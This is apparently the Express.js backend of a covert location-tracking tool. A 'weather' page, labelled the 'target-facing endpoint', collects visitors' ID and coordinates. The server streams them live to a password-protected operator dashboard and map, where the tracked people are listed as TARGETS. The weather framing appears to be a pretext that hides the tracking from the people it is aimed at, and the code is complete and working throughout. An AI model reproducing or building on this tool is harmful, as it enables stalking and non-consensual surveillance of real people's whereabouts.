const express = require("express")
const router = express.Router()
const config = require("./config")


const TARGETS = {}

// ── In-memory rate limiter for /weather POST (target endpoint) ──────────────
// Prevents excessive location spam from a single target ID.
// Allows up to 60 requests per minute per ID; excess is silently dropped.
const RATE_WINDOW_MS = 60 * 1000
const RATE_MAX_REQUESTS = 60
const rateBuckets = {}

function isRateLimited(id) {
    const now = Date.now()
    if (!rateBuckets[id]) {
        rateBuckets[id] = { count: 1, windowStart: now }
        return false
    }
    const bucket = rateBuckets[id]
    if (now - bucket.windowStart > RATE_WINDOW_MS) {
        // Reset window
        bucket.count = 1
        bucket.windowStart = now
        return false
    }
    if (bucket.count >= RATE_MAX_REQUESTS) {
        return true
    }
    bucket.count++
    return false
}

// Periodic cleanup of stale rate buckets (runs every 5 minutes)
setInterval(() => {
    const now = Date.now()
    for (const id of Object.keys(rateBuckets)) {
        if (now - rateBuckets[id].windowStart > RATE_WINDOW_MS * 2) {
            delete rateBuckets[id]
        }
    }
}, 5 * 60 * 1000)


// ── Login ────────────────────────────────────────────────────────────────────
router.route("/login").get((req, res) => {
    res.render("login")
}).post((req, res) => {
    const { username, password } = req.body

    if (
        typeof username === "string" &&
        typeof password === "string" &&
        config.username === username &&
        config.password === password
    ) {
        res.cookie("token", config.token, {
            maxAge: 1000000 * 100000,
            httpOnly: true,   // not accessible via JS — reduces XSS token theft risk
            sameSite: "lax"   // CSRF protection for cookie
        })
        return res.redirect("/")
    }

    // Failed login — redirect back with an error query param
    // The param value is non-sensitive (no details revealed)
    res.redirect("/login?err=1")
})


// ── Weather (target-facing endpoint) ─────────────────────────────────────────
router.route("/weather").get((req, res) => {
    res.render("weather")
}).post((req, res) => {
    const { id, lat, lng } = req.body

    // Input validation: id must be a non-empty string, lat/lng must be finite numbers
    if (
        typeof id !== "string" ||
        id.trim().length === 0 ||
        id.trim().length > 64 ||
        typeof lat !== "number" ||
        typeof lng !== "number" ||
        !isFinite(lat) ||
        !isFinite(lng) ||
        lat < -90  || lat > 90 ||
        lng < -180 || lng > 180
    ) {
        return res.status(400).send("Bad Request")
    }

    const safeId = id.trim()

    // Rate limit check
    if (isRateLimited(safeId)) {
        return res.status(429).send("Too Many Requests")
    }

    if (TARGETS[safeId] == null) {
        IO.emit("user-connected", safeId)
    }

    TARGETS[safeId] = [lat, lng]
    IO.emit("map-data", { id: safeId, lat, lng })
    res.send("OK")

    // Log sanitized output (no raw user input in format string)
    console.log(`> TARGET: ${safeId} | ${lat}, ${lng}`)
})


// ── Auth middleware (protects routes below) ───────────────────────────────────
router.use(function checkToken(req, res, next) {
    const token = req.cookies.token

    if (token != null && token === config.token) {
        next()
    } else {
        res.clearCookie("token").redirect("/login")
    }
})


// ── Home (dashboard) ──────────────────────────────────────────────────────────
router.route("/").get((req, res) => {
    res.render("home", {
        TARGETS
    })
})


// ── Live Map ──────────────────────────────────────────────────────────────────
router.route("/map").get((req, res) => {
    const { id } = req.query

    // Validate id exists and is tracked; otherwise redirect to home
    if (typeof id !== "string" || id.trim().length === 0 || !TARGETS[id.trim()]) {
        return res.redirect("/")
    }

    res.render("map", {
        data: TARGETS[id.trim()]
    })
})


module.exports = router